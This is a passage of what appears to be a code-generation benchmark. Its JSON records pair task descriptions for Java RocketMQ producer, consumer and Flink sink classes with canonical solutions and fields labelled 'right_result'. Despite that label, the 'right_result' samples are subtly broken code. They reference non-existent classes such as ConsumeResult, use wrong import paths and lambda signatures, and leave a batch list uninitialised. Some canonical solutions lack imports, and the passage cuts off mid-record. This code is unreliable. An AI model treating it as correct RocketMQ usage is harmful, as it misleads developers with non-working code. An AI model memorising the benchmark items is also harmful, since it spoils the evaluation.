    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport top.lrshuai.mq.comment.Const;\nimport top.lrshuai.mq.test.entity.AccountPlan;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class PlanConsumer {\n\n    @Value(\"${apache.rocketmq.consumer.PushConsumer}\")\n    private String consumerGroup;\n\n    @Value(\"${apache.rocketmq.namesrvAddr}\")\n    private String namesrvAddr;\n\n    private Logger logger = LoggerFactory.getLogger(this.getClass());\n\n    @PostConstruct\n    public void defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        try {\n            consumer.subscribe(Const.PLAN_TOPIC, \"*\");\n            consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n            consumer.registerMessageListener((MessageListenerConcurrently) (list, context) -> {\n                MessageExt tempMsg = null;\n                try {\n                    for (MessageExt msg : list) {\n                        tempMsg = msg;\n                        String messageBody = new String(msg.getBody(), \"utf-8\");\n                        AccountPlan plan = JSON.parseObject(messageBody, AccountPlan.class);\n                        logger.info(\"\u6d88\u8d39\u6210\u529f\uff1amsgId={}\uff0cplan={}\", msg.getMsgId(), plan);\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                    if(tempMsg.getReconsumeTimes() == 3) {\n                        logger.error(\"msg consume error by:{}\", tempMsg);\n                        return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                    }\n                    return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            });\n            consumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport org.springframework.beans.factory.annotation.Autowired;\n\nimport javax.annotation.PostConstruct;\n\n@Component\npublic class PlanConsumer {\n\n    @Value(\"${rocketmq.consumerGroup}\")\n    private String consumerGroup;\n\n    @Value(\"${rocketmq.namesrvAddr}\")\n    private String namesrvAddr;\n\n    private final Logger logger = LoggerFactory.getLogger(PlanConsumer.class);\n\n    @PostConstruct\n    public void defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(\"yourTopic\", \"*\");\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        consumer.registerMessageListener((MessageListenerConcurrently) (message, object) -> {\n            for (int i = 0; i < 3; i++) {\n                try {\n                    logger.info(\"Processing message: {}\", message);\n                    // Process message logic here\n                    return ConsumeResult.CONSUME_SUCCESS;\n                } catch (Exception e) {\n                    logger.warn(\"Retry attempt {} of 3 for message: {}\", i + 1, message);\n                    // Optionally add delay before retry\n                }\n            }\n            return ConsumeResult.FAILED;\n        });\n\n        consumer.start();\n    }\n}"
  },
  {
    "Task_id": 376,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to asynchronously receive and process messages from a specified topic with tag filtering.\n\nClass Description: The PushConsumer class is a RocketMQ message consumer that subscribes to a topic and processes incoming messages using a concurrent message listener. It supports broadcasting message model and can be configured with various consumption strategies.\n\nAttributes:\n- CONSUMER_GROUP: [String] - The consumer group name for this consumer instance\n- DEFAULT_NAMESRVADDR: [String] - Default NameServer address for RocketMQ\n- TOPIC: [String] - The topic to subscribe to for messages\n- SUB_EXPRESSION: [String] - Tag filter expression for message subscription\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- PushConsumer() [Constructor] -> [void] - Initializes the consumer with default settings, subscribes to the topic, and registers the message listener\n- start() -> [void] - Starts the consumer to begin receiving messages\n- shutdown() -> [void] - Shuts down the consumer and releases resources",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.remoting.protocol.heartbeat.MessageModel;\n\npublic class PushConsumer {\n\n    public static final String CONSUMER_GROUP = \"please_rename_unique_group_name_1\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicTest\";\n    public static final String SUB_EXPRESSION = \"TagA || TagC || TagD\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.setMessageModel(MessageModel.BROADCASTING);\n        consumer.subscribe(TOPIC, SUB_EXPRESSION);\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        System.out.printf(\"Broadcast Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;  \nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;  \nimport org.apache.rocketmq.client.consumer.listener.ConsumeContext;  \nimport org.apache.rocketmq.common.message.MessageExt;  \nimport org.apache.rocketmq.client.consumer.MessageModel;  \n\npublic class PushConsumer {  \n    private String CONSUMER_GROUP = \"my-group\";  \n    private String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";  \n    private String TOPIC = \"test-topic\";  \n    private String SUB_EXPRESSION = \"tag1||tag2\";  \n    private DefaultMQPushConsumer consumer;  \n\n    public PushConsumer() {  \n        this.consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);  \n        this.consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);  \n        this.consumer.setMessageModel(MessageModel.BROADCASTING);  \n        this.consumer.subscribe(TOPIC, SUB_EXPRESSION);  \n        this.consumer.registerMessageListener(new MessageListenerConcurrently() {  \n            @Override  \n            public ConsumeResult consumeMessage(List<MessageExt> messages, ConsumeContext context) {  \n                for (MessageExt message : messages) {  \n                    processMessage(message);  \n                }  \n                return ConsumeResult.SUCCESS;  \n            }  \n        });  \n    }  \n\n    public void start() {  \n        try {  \n            consumer.start();  \n        } catch (Exception e) {  \n            e.printStackTrace();  \n        }  \n    }  \n\n    public void shutdown() {  \n        consumer.shutdown();  \n    }  \n\n    private void processMessage(MessageExt message) {  \n        System.out.println(\"Received message: \" + new String(message.getBody()));  \n    }  \n}"
  },
  {
    "Task_id": 377,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer with namespace support to asynchronously consume messages from a specified topic.\n\nClass Description: The PushConsumerWithNamespace class is designed to consume messages from a RocketMQ topic using a push-based model. It supports namespace configuration and provides methods to initialize, start, and shutdown the consumer. The consumer processes messages concurrently and prints message details to the console.\n\nAttributes:\n- NAMESPACE: [String] - The namespace identifier for the RocketMQ instance\n- CONSUMER_GROUP: [String] - The consumer group name\n- DEFAULT_NAMESRVADDR: [String] - The NameServer address\n- TOPIC: [String] - The topic to subscribe to\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- initializeConsumer(): [void]() -> [void] - Initializes the consumer with namespace, NameServer address, topic subscription, and message listener configuration\n- startConsumer(): [void]() -> [void] - Starts the consumer to begin message consumption\n- shutdownConsumer(): [void]() -> [void] - Shuts down the consumer gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\n\npublic class PushConsumerWithNamespace {\n    public static final String NAMESPACE = \"InstanceTest\";\n    public static final String CONSUMER_GROUP = \"cidTest\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"NAMESPACE_TOPIC\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public void initializeConsumer() throws Exception {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamespaceV2(NAMESPACE);\n        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        consumer.subscribe(TOPIC, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            msgs.forEach(msg -> System.out.printf(\"Msg topic is:%s, MsgId is:%s, reconsumeTimes is:%s%n\", \n                msg.getTopic(), msg.getMsgId(), msg.getReconsumeTimes()));\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void startConsumer() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdownConsumer() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;  \nimport org.apache.rocketmq.client.consumer.MessageListenerConcurrently;  \nimport org.apache.rocketmq.common.message.MessageExt;  \nimport org.apache.rocketmq.client.exception.MQClientException;  \n\npublic class PushConsumerWithNamespace {  \n    private String NAMESPACE;  \n    private String CONSUMER_GROUP;  \n    private String DEFAULT_NAMESRVADDR;  \n    private String TOPIC;  \n    private DefaultMQPushConsumer consumer;  \n\n    public PushConsumerWithNamespace(String namespace, String consumerGroup, String defaultNamesrvAddr, String topic) {  \n        this.NAMESPACE = namespace;  \n        this.CONSUMER_GROUP = consumerGroup;  \n        this.DEFAULT_NAMESRVADDR = defaultNamesrvAddr;  \n        this.TOPIC = topic;  \n    }  \n\n    public void initializeConsumer() throws MQClientException {  \n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);  \n        consumer.setNamesrvAddr(NAMESPACE + \"-\" + DEFAULT_NAMESRVADDR);  \n        consumer.subscribe(TOPIC, \"*\");  \n        consumer.registerMessageListener((List<MessageExt> messages, ConsumeContext context) -> {  \n            for (MessageExt message : messages) {  \n                System.out.println(\"Received message: \" + new String(message.getBody()));  \n            }  \n            return ConsumeResult.SUCCESS;  \n        });  \n    }  \n\n    public void startConsumer() {  \n        try {  \n            consumer.start();  \n        } catch (MQClientException e) {  \n            e.printStackTrace();  \n        }  \n    }  \n\n    public void shutdownConsumer() {  \n        consumer.shutdown();  \n    }  \n}"
  },
  {
    "Task_id": 378,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to subscribe to messages from a specified topic and handle them asynchronously.\n\nClass Description: The RocketMQConsumer class is a message consumer implementation that uses RocketMQ's push-based consumption model. It subscribes to a specified topic, configures consumption settings, and processes incoming messages through a registered message listener.\n\nAttributes:\n- log: Logger - SLF4J logger instance for logging consumer activities\n- defaultMQPushConsumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance\n- rpcHook: RPCHook - Optional RPC hook for custom communication handling\n- topicName: String - The topic name to subscribe to\n- consumerGroup: String - The consumer group name for this consumer\n\nMethods:\n- RocketMQConsumer(RPCHook, String, String) -> void - Constructor that initializes the consumer with RPC hook, topic name, and consumer group\n- startConsumer() -> void - Configures and starts the consumer instance, subscribes to the topic, and registers the message listener\n- shutdown() -> void - Gracefully shuts down the consumer instance\n- buildSendMessageRequestHeader(Message, String, int) -> SendMessageRequestHeader - Helper method to build message request headers for sending messages\n- (implements) consumeMessage(List<MessageExt>, ConsumeConcurrentlyContext) -> ConsumeConcurrentlyStatus - Message listener implementation that processes consumed messages (inherited from MessageListenerConcurrently interface)",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport java.nio.charset.StandardCharsets;\nimport java.time.Duration;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageDecoder;\nimport org.apache.rocketmq.common.topic.TopicValidator;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.proxy.common.ProxyContext;\nimport org.apache.rocketmq.proxy.common.ProxyException;\nimport org.apache.rocketmq.proxy.common.ProxyExceptionCode;\nimport org.apache.rocketmq.remoting.RPCHook;\nimport org.apache.rocketmq.remoting.protocol.header.SendMessageRequestHeader;\nimport org.apache.rocketmq.remoting.protocol.heartbeat.MessageModel;\n\npublic class RocketMQConsumer implements MessageListenerConcurrently {\n    private static final Logger log = LoggerFactory.getLogger(LoggerName.PROXY_LOGGER_NAME);\n    private DefaultMQPushConsumer defaultMQPushConsumer;\n    private RPCHook rpcHook;\n    private String topicName;\n    private String consumerGroup;\n\n    public RocketMQConsumer(RPCHook rpcHook, String topicName, String consumerGroup) {\n        this.rpcHook = rpcHook;\n        this.topicName = topicName;\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void startConsumer() throws Exception {\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(this.consumerGroup, this.rpcHook);\n        this.defaultMQPushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        this.defaultMQPushConsumer.setMessageModel(MessageModel.BROADCASTING);\n        \n        try {\n            this.defaultMQPushConsumer.subscribe(this.topicName, \"*\");\n        } catch (MQClientException e) {\n            throw new ProxyException(ProxyExceptionCode.INTERNAL_SERVER_ERROR, \n                \"subscribe to topic \" + this.topicName + \" failed. \" + e.getMessage());\n        }\n        \n        this.defaultMQPushConsumer.registerMessageListener(this);\n        this.defaultMQPushConsumer.start();\n    }\n\n    public void shutdown() throws Exception {\n        if (this.defaultMQPushConsumer != null) {\n            this.defaultMQPushConsumer.shutdown();\n        }\n    }\n\n    protected SendMessageRequestHeader buildSendMessageRequestHeader(Message message,\n        String producerGroup, int queueId) {\n        SendMessageRequestHeader requestHeader = new SendMessageRequestHeader();\n        requestHeader.setProducerGroup(producerGroup);\n        requestHeader.setTopic(message.getTopic());\n        requestHeader.setDefaultTopic(TopicValidator.AUTO_CREATE_TOPIC_KEY_TOPIC);\n        requestHeader.setDefaultTopicQueueNums(0);\n        requestHeader.setQueueId(queueId);\n        requestHeader.setSysFlag(0);\n        requestHeader.setBornTimestamp(System.currentTimeMillis());\n        requestHeader.setFlag(message.getFlag());\n        requestHeader.setProperties(MessageDecoder.messageProperties2String(message.getProperties()));\n        requestHeader.setReconsumeTimes(0);\n        requestHeader.setBatch(false);\n        return requestHeader;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.message.SendMessageRequestHeader;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.rpcheader.RPCHook;\n\npublic class RocketMQConsumer implements MessageListenerConcurrently {\n    private final Logger log;\n    private final DefaultMQPushConsumer defaultMQPushConsumer;\n    private final RPCHook rpcHook;\n    private final String topicName;\n    private final String consumerGroup;\n\n    public RocketMQConsumer(RPCHook rpcHook, String topicName, String consumerGroup) {\n        this.rpcHook = rpcHook;\n        this.topicName = topicName;\n        this.consumerGroup = consumerGroup;\n        this.log = LoggerFactory.getLogger(RocketMQConsumer.class);\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(consumerGroup);\n        if (rpcHook != null) {\n            this.defaultMQPushConsumer.setRPCHook(rpcHook);\n        }\n    }\n\n    public void startConsumer() throws MQClientException {\n        this.defaultMQPushConsumer.setNamesrvAddr(\"localhost:9876\");\n        this.defaultMQPushConsumer.subscribe(topicName, \"*\");\n        this.defaultMQPushConsumer.registerMessageListener(this::consumeMessage);\n        this.defaultMQPushConsumer.start();\n    }\n\n    public void shutdown() {\n        if (defaultMQPushConsumer != null) {\n            try {\n                defaultMQPushConsumer.shutdown();\n            } catch (Exception e) {\n                log.error(\"Failed to shutdown consumer\", e);\n            }\n        }\n    }\n\n    private SendMessageRequestHeader buildSendMessageRequestHeader(Message message, String tag, int flag) {\n        return new SendMessageRequestHeader(message.getTopic(), tag, message.getTags(), flag);\n    }\n\n    @Override\n    public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> list, ConsumeConcurrentlyContext context) {\n        for (MessageExt message : list) {\n            log.info(\"Received message: {}\", message.getBody());\n            // Process message logic here\n        }\n        return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n    }\n}"
  },
  {
    "Task_id": 381,
    "Instruction": "Task Description: Implement a Java class that acts as a RocketMQ producer to send messages to a specified topic using Apache RocketMQ client library.\n\nClass Description: The RocketMQProducer class encapsulates the functionality to create, configure, and manage a RocketMQ message producer. It handles producer initialization, message creation, message sending, and producer shutdown.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The address of the NameServer for service discovery\n- producerGroup: String - The group name of the producer\n- topic: String - The target topic for message sending\n- messageSize: int - The size of the message to be sent\n\nMethods:\n- RocketMQProducer(String, String, String, int) - Constructor - Initializes the producer with NameServer address, producer group, topic, and message size\n- start() -> void - Configures and starts the producer instance\n- sendMessage() -> SendResult - Creates and sends a message to the configured topic\n- shutdown() -> void - Shuts down the producer instance",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport java.nio.charset.StandardCharsets;\n\npublic class RocketMQProducer {\n\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n    private String producerGroup;\n    private String topic;\n    private int messageSize;\n\n    public RocketMQProducer(String namesrvAddr, String producerGroup, String topic, int messageSize) {\n        this.namesrvAddr = namesrvAddr;\n        this.producerGroup = producerGroup;\n        this.topic = topic;\n        this.messageSize = messageSize;\n        this.producer = new DefaultMQProducer(producerGroup);\n    }\n\n    public void start() throws MQClientException {\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setVipChannelEnabled(false);\n        producer.start();\n    }\n\n    public SendResult sendMessage() throws Exception {\n        StringBuilder sb = new StringBuilder();\n        for (int j = 0; j < messageSize; j += 10) {\n            sb.append(\"hello baby\");\n        }\n        byte[] body = sb.toString().getBytes(StandardCharsets.UTF_8);\n        Message message = new Message(topic, body);\n        return producer.send(message);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.client.producer.SendResult;\n\npublic class RocketMQProducer {\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n    private String producerGroup;\n    private String topic;\n    private int messageSize;\n\n    public RocketMQProducer(String namesrvAddr, String producerGroup, String topic, int messageSize) {\n        this.namesrvAddr = namesrvAddr;\n        this.producerGroup = producerGroup;\n        this.topic = topic;\n        this.messageSize = messageSize;\n        this.producer = new DefaultMQProducer(producerGroup);\n    }\n\n    public void start() {\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public SendResult sendMessage() {\n        byte[] body = new byte[messageSize];\n        Message message = new Message(topic, \"Tag\", body);\n        return producer.send(message);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 383,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ message producer sink for sending messages to RocketMQ topics, supporting both synchronous and asynchronous message delivery, batch processing, and configurable message delay levels.\n\nClass Description: The RocketMQSink class is a Flink-compatible sink that sends messages to RocketMQ. It handles message serialization, topic selection, and provides configurable message delivery options including synchronous/asynchronous sending, batch processing, and delayed message delivery.\n\nAttributes:\n- LOG: Logger - Logger instance for logging debug and error messages\n- producer: DefaultMQProducer - RocketMQ producer instance for sending messages\n- async: boolean - Flag indicating whether to use asynchronous message sending\n- props: Properties - Configuration properties for the producer\n- topicSelector: TopicSelector<IN> - Selector for determining message topics and tags\n- serializationSchema: KeyValueSerializationSchema<IN> - Schema for serializing input data\n- batchFlushOnCheckpoint: boolean - Flag indicating whether to use batch processing\n- batchSize: int - Maximum batch size for batch processing\n- batchList: List<Message> - Buffer for batch messages\n- messageDeliveryDelayLevel: int - Configuration for delayed message delivery\n\nMethods:\n- RocketMQSink(KeyValueSerializationSchema<IN>, TopicSelector<IN>, Properties) -> void - Constructor that initializes the sink with serialization schema, topic selector, and configuration properties\n- open(Configuration) -> void - Initializes the RocketMQ producer and prepares for message sending\n- invoke(IN) -> void - Processes and sends a single message (either immediately or adds to batch)\n- prepareMessage(IN) -> Message - Creates a RocketMQ Message object from input data\n- close() -> void - Cleans up resources and shuts down the producer\n- flushSync() -> void - Sends all batched messages synchronously (used when batch processing is enabled)",
    "Canonical_solution": "import com.zhisheng.connectors.rocketmq.common.selector.TopicSelector;\nimport com.zhisheng.connectors.rocketmq.common.serialization.KeyValueSerializationSchema;\nimport org.apache.commons.lang3.Validate;\nimport org.apache.flink.configuration.Configuration;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.nio.charset.StandardCharsets;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Properties;\n\npublic class RocketMQSink<IN> {\n    private static final Logger LOG = LoggerFactory.getLogger(RocketMQSink.class);\n\n    private transient DefaultMQProducer producer;\n    private boolean async;\n    private Properties props;\n    private TopicSelector<IN> topicSelector;\n    private KeyValueSerializationSchema<IN> serializationSchema;\n    private boolean batchFlushOnCheckpoint;\n    private int batchSize = 1000;\n    private List<Message> batchList;\n    private int messageDeliveryDelayLevel;\n\n    public RocketMQSink(KeyValueSerializationSchema<IN> schema, TopicSelector<IN> topicSelector, Properties props) {\n        this.serializationSchema = schema;\n        this.topicSelector = topicSelector;\n        this.props = props;\n        this.messageDeliveryDelayLevel = RocketMQUtils.getInteger(this.props, RocketMQConfig.MSG_DELAY_LEVEL,\n                RocketMQConfig.MSG_DELAY_LEVEL00);\n        if (this.messageDeliveryDelayLevel < RocketMQConfig.MSG_DELAY_LEVEL00) {\n            this.messageDeliveryDelayLevel = RocketMQConfig.MSG_DELAY_LEVEL00;\n        } else if (this.messageDeliveryDelayLevel > RocketMQConfig.MSG_DELAY_LEVEL18) {\n            this.messageDeliveryDelayLevel = RocketMQConfig.MSG_DELAY_LEVEL18;\n        }\n    }\n\n    public void open(Configuration parameters) throws Exception {\n        Validate.notEmpty(props, \"Producer properties can not be empty\");\n        Validate.notNull(topicSelector, \"TopicSelector can not be null\");\n        Validate.notNull(serializationSchema, \"KeyValueSerializationSchema can not be null\");\n\n        producer = new DefaultMQProducer();\n        producer.setInstanceName(String.valueOf(getRuntimeContext().getIndexOfThisSubtask()));\n        RocketMQConfig.buildProducerConfigs(props, producer);\n        batchList = new LinkedList<>();\n\n        try {\n            producer.start();\n        } catch (MQClientException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void invoke(IN input) throws Exception {\n        Message msg = prepareMessage(input);\n\n        if (batchFlushOnCheckpoint) {\n            batchList.add(msg);\n            if (batchList.size() >= batchSize) {\n                flushSync();\n            }\n            return;\n        }\n\n        if (async) {\n            try {\n                producer.send(msg, new SendCallback() {\n                    @Override\n                    public void onSuccess(SendResult sendResult) {\n                        LOG.debug(\"Async send message success! result: {}\", sendResult);\n                    }\n\n                    @Override\n                    public void onException(Throwable throwable) {\n                        if (throwable != null) {\n                            LOG.error(\"Async send message failure!\", throwable);\n                        }\n                    }\n                });\n            } catch (Exception e) {\n                LOG.error(\"Async send message failure!\", e);\n            }\n        } else {\n            try {\n                SendResult result = producer.send(msg);\n                LOG.debug(\"Sync send message result: {}\", result);\n            } catch (Exception e) {\n                LOG.error(\"Sync send message failure!\", e);\n            }\n        }\n    }\n\n    private Message prepareMessage(IN input) {\n        String topic = topicSelector.getTopic(input);\n        String tag = topicSelector.getTag(input) != null ? topicSelector.getTag(input) : \"\";\n\n        byte[] k = serializationSchema.serializeKey(input);\n        String key = k != null ? new String(k, StandardCharsets.UTF_8) : \"\";\n        byte[] value = serializationSchema.serializeValue(input);\n\n        Validate.notNull(topic, \"the message topic is null\");\n        Validate.notNull(value, \"the message body is null\");\n\n        Message msg = new Message(topic, tag, key, value);\n        if (this.messageDeliveryDelayLevel > RocketMQConfig.MSG_DELAY_LEVEL00) {\n            msg.setDelayTimeLevel(this.messageDeliveryDelayLevel);\n        }\n        return msg;\n    }\n\n    public void close() throws Exception {\n        if (producer != null) {\n            flushSync();\n            producer.shutdown();\n        }\n    }\n\n    private void flushSync() throws Exception {\n        if (batchFlushOnCheckpoint) {\n            synchronized (batchList) {\n                if (batchList.size() > 0) {\n                    producer.send(batchList);\n                    batchList.clear();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.flink.api.common.functions.RuntimeContext;\nimport org.apache.flink.api.common.serialization.KeyValueSerializationSchema;\nimport org.apache.flink.configuration.Configuration;\nimport org.apache.flink.runtime.eventtime.TimestampAssigner;\nimport org.apache.flink.util.Collector;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Properties;\n\npublic class RocketMQSink<IN> implements org.apache.flink.streaming.api.functions.sink.SinkFunction<IN> {\n    private static final long serialVersionUID = 1L;\n    private final Logger LOG = LoggerFactory.getLogger(RocketMQSink.class);\n    private DefaultMQProducer producer;\n    private boolean async;\n    private Properties props;\n    private TopicSelector<IN> topicSelector;\n    private KeyValueSerializationSchema<IN> serializationSchema;\n    private boolean batchFlushOnCheckpoint;\n    private int batchSize;\n    private List<Message> batchList;\n    private int messageDeliveryDelayLevel;\n\n    public RocketMQSink(KeyValueSerializationSchema<IN> serializationSchema, TopicSelector<IN> topicSelector, Properties props) {\n        this.serializationSchema = serializationSchema;\n        this.topicSelector = topicSelector;\n        this.props = props;\n        this.async = Boolean.parseBoolean(props.getProperty(\"rocketmq.async\", \"false\"));\n        this.batchFlushOnCheckpoint = Boolean.parseBoolean(props.getProperty(\"rocketmq.batch.flush.on.checkpoint\", \"false\"));\n        this.batchSize = Integer.parseInt(props.getProperty(\"rocketmq.batch.size\", \"1\"));\n        this.messageDeliveryDelayLevel = Integer.parseInt(props.getProperty(\"rocketmq.delay.level\", \"0\"));\n    }\n\n    @Override\n    public void open(Configuration parameters) throws Exception {\n        producer = new DefaultMQProducer(props.getProperty(\"rocketmq.producer.group\"));\n        producer.setNamesrvAddr(props.getProperty(\"rocketmq.namesrv.addr\"));\n        if (batchFlushOnCheckpoint) {\n            producer.setBatchSendMaxSize(batchSize);\n        }\n        producer.start();\n    }\n\n    @Override\n    public void invoke(IN value) throws Exception {\n        Message msg = prepareMessage(value);\n        if (batchFlushOnCheckpoint) {\n            batchList.add(msg);\n            if (batchList.size() == batchSize) {\n                flushSync();\n                batchList.clear();\n            }\n        } else {\n            if (async) {\n                producer.send(msg, new SendCallback() {\n                    @Override\n                    public void onSuccess(SendResult sendResult) {\n                        LOG.info(\"Message sent successfully: {}\", sendResult);\n                    }\n\n                    @Override\n                    public void onException(Throwable e) {\n                        LOG.error(\"Failed to send message\", e);\n                    }\n                });\n            } else {\n                producer.send(msg);\n            }\n        }\n    }\n\n    private Message prepareMessage(IN value) {\n        String topic = topicSelector.selectTopic(value);\n        String tag = topicSelector.selectTag(value);\n        byte[] body = serializationSchema.serialize(value);\n        int delayTimeMillis = messageDeliveryDelayLevel * 1000;\n        return new Message(topic, tag, body, delayTimeMillis);\n    }\n\n    @Override\n    public void close() throws Exception {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n\n    private void flushSync() {\n        if (batchFlushOnCheckpoint && !batchList.isEmpty()) {\n            try {\n                producer.send(batchList);\n            } catch (Exception e) {\n                